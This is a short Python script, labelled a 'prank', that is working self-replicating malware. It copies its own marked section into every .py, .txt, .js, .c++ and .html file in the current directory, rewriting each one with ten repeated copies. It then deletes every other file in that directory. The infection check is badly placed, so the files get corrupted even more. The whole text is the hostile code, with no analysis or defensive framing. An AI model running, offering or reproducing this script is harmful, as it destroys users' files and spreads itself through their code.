##You are hackked ##
import sys, glob
import os
code=[]
with open(sys.argv[0], 'r') as f:
    lines=f.readlines()
virus_area=False
for line in lines:
    if line=="##You are hackked ##\n":
        virus_area=True
    if virus_area:
        code.append(line)
    if line=="##Prank ##\n":
        break

files=glob.glob('*.py' ) + glob.glob('*.txt') + glob.glob('*.js')+glob.glob('*.c++')+glob.glob('*.html')
for file in files:
    with open(file, 'r') as f:
        script_code=f.readlines()
    infected=False
    for line in script_code:
        if line=="##You are hackked ##\n":
            infected=True
            break
        if not infected:
            final_code=[]
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)
            with open(file, 'w') as f:
                for count in range(10):
                    f.writelines(final_code)

                
all_files=os.listdir()
for file in all_files:
    if file not in files:
        os.remove(file)


##Prank ##